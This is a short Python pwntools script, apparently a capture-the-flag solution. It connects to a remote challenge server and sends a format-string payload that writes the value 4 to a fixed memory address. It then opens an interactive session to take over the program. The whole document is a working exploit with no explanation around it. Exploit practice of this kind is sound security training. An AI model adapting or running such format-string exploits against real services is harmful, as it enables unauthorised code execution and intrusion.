from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29021)
elf = ELF('./pwn')

io.sendline(fmtstr_payload(11, {0x804A02C: 4}))

io.interactive()